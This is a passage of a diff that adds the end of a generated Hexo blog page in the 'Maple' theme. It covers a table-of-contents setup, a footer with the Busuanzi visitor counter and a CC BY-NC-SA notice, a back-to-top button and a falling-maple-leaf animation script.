+        tocSelector: '.post-toc',
+        // Where to grab the headings to build the table of contents.
+        contentSelector: '.post-content',
+        // Which headings to grab inside of the contentSelector element.
+        headingSelector: 'h1, h2, h3',
+        // For headings inside relative or absolute positioned containers within content.
+        hasInnerContainers: true,
+    });
+  })
+</script>
+<!-- tocbot end -->
+
+
+  </main>
+  <footer class="flex flex-col h-40 items-center justify-center text-gray-400 text-sm">
+  <!-- busuanzi -->
+  
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<!-- Busuanzi Analytics -->
+<div class="flex items-center gap-2">
+  <span>Visitors</span>
+  <span id="busuanzi_value_site_uv"></span>
+  <span>Page Views</span>
+  <span id="busuanzi_value_site_pv"></span>
+</div>
+<!-- End Busuanzi Analytics -->
+
+
+  <!-- copyright -->
+  <div class="flex items-center gap-2">
+    <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" style="color: inherit;">CC BY-NC-SA 4.0</a>
+    <span>© 2023</span>
+    <iconify-icon width="18" icon="emojione-monotone:maple-leaf" ></iconify-icon>
+    <a href="https://github.com/hehanzzz" target="_blank" rel="noopener noreferrer">Hehanzzz</a>
+  </div>
+  <!-- powered by -->
+  <div class="flex items-center gap-2">
+    <span>Powered by</span>
+    <a href="https://hexo.io/" target="_blank" rel="noopener noreferrer">Hexo</a>
+    <span>&</span>
+    <a href="https://github.com/hehanzzz" target="_blank" rel="noopener noreferrer">Maple</a>
+  </div>
+
+</footer>
+
+  <div class="back-to-top box-border fixed right-6 z-1024 -bottom-20 rounded py-1 px-1 bg-slate-900 opacity-60 text-white cursor-pointer text-center dark:bg-slate-600">
+    <span class="flex justify-center items-center text-sm">
+      <iconify-icon width="18" icon="ion:arrow-up-c" id="go-top"></iconify-icon>
+      <span id="scrollpercent"><span>0</span> %</span>
+    </span>
+  </div>
+  
+<script src="/js/main.js"></script>
+
+
+  <script>
+    $(document).ready(function () {
+      const mapleCount = "10";
+      const speed = "0.5";
+      const mapleEl = document.getElementById("maple");
+      const maples = Array.from({ length: mapleCount }).map(() => {
+        const maple = document.createElement("div");
+        const scale = Math.random() * 0.5 + 0.5;
+        const offset = Math.random() * 2 - 1;
+        const x = Math.random() * mapleEl.clientWidth;
+        const y = -Math.random() * mapleEl.clientHeight;
+        const duration = 10 / speed;
+        const delay = -duration;
+        maple.className = "maple";
+        maple.style.width = `${24 * scale}px`;
+        maple.style.height = `${24 * scale}px`;
+        maple.style.left = `${x}px`;
+        maple.style.top = `${y}px`;
+        maple.style.setProperty("--maple-fall-offset", offset);
+        maple.style.setProperty("--maple-fall-height", `${Math.abs(y) + mapleEl.clientHeight}px`);
+        maple.style.animation = `fall ${duration}s linear infinite`;
+        maple.style.animationDelay = `${delay}s`;
+        mapleEl.appendChild(maple)
+        return maple
+      })
+    });
+  </script>
+  
+
+
+  <div class="fixed top-0 bottom-0 left-0 right-0 pointer-events-none print:hidden" id="maple"></div>
+</body>
+
+</html>
